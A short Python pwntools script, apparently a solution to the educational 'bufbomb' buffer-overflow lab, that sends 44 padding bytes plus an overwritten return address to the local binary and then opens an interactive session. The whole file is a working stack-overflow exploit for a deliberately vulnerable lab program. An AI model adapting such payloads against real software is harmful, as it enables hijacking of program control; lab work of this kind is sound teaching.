from pwn import *

elf = ELF("./bufbomb")

p = elf.process(['-u20521859'])
#raw_input("DEBUG")

payload = b"A"*44
payload += p32(0x8004422b)

p.sendline(payload)

p.interactive()
